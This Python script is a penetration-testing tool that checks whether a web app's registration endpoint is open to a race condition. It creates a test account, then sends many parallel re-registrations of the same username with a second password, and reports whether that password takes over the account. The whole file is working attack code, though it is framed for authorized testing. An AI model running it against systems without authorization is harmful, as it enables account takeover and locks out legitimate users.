#!/usr/bin/env python3
"""
race_register.py — Concurrent registration race / account-takeover detector.

Many apps check "username free?" then insert without a lock or unique constraint.
Under parallel POSTs that check can pass many times — last write wins on the
password hash → attacker sets the password, victim is locked out.

    python TOOLS/race_register.py --url https://target \
        --register /api/register --login /api/login \
        --user-field username --pass-field password \
        --workers 20

Only use on systems you own or are authorized to test.
"""
import argparse
import concurrent.futures
import json
import sys
import time
import urllib.error
import urllib.request
from collections import Counter


def _req(url, method="GET", body=None, timeout=15):
    data = None if body is None else json.dumps(body).encode()
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw
    except Exception as e:
        return 0, str(e)


def main():
    p = argparse.ArgumentParser(description="Registration race / account-takeover probe")
    p.add_argument("--url", required=True, help="Base URL (authorized target only)")
    p.add_argument("--register", default="/api/register", help="Register path")
    p.add_argument("--login", default="/api/login", help="Login path")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--workers", type=int, default=16)
    p.add_argument("--prefix", default="raceprobe")
    args = p.parse_args()
    base = args.url.rstrip("/")
    reg_url = base + args.register
    login_url = base + args.login

    uname = f"{args.prefix}_{int(time.time()) % 100000}"
    victim_pw = "VictimRacePass!99"
    attacker_pw = "AttackerRacePass!99"

    print("=" * 48)
    print(" RACE REGISTER — account takeover probe")
    print("=" * 48)
    print(f"[*] target={base}")
    print(f"[*] username={uname} workers={args.workers}")

    # Victim claims the name first
    st, body = _req(reg_url, "POST", {args.user_field: uname, args.pass_field: victim_pw})
    print(f"[*] victim register -> HTTP {st}")
    if st not in (200, 201):
        print(f"[-] could not create victim account: {body}")
        return 2

    def attack(_):
        return _req(reg_url, "POST", {args.user_field: uname, args.pass_field: attacker_pw})

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        results = list(ex.map(attack, range(args.workers)))
    counts = Counter(st for st, _ in results)
    print(f"[*] parallel re-register results: {dict(counts)}")
    multi_201 = sum(1 for st, _ in results if st in (200, 201))
    if multi_201:
        print(f"[!] {multi_201} concurrent register(s) returned success for an existing username")

    st_a, _ = _req(login_url, "POST", {args.user_field: uname, args.pass_field: attacker_pw})
    st_v, _ = _req(login_url, "POST", {args.user_field: uname, args.pass_field: victim_pw})
    print(f"[*] login attacker password -> HTTP {st_a}")
    print(f"[*] login victim password   -> HTTP {st_v}")

    if st_a in (200, 201) and st_v in (401, 403):
        print("[🔥 HACK] ACCOUNT TAKEOVER via registration race")
        print("    attacker password accepted; victim locked out")
        return 0
    if multi_201 > 0:
        print("[🟡 WARN] race window present (multiple success codes) but takeover not confirmed")
        return 0
    if counts.get(409) or counts.get(400):
        print("[🟢 PASS] re-register rejected — unique username enforcement held under load")
        return 0
    print("[*] inconclusive")
    return 1


if __name__ == "__main__":
    sys.exit(main())
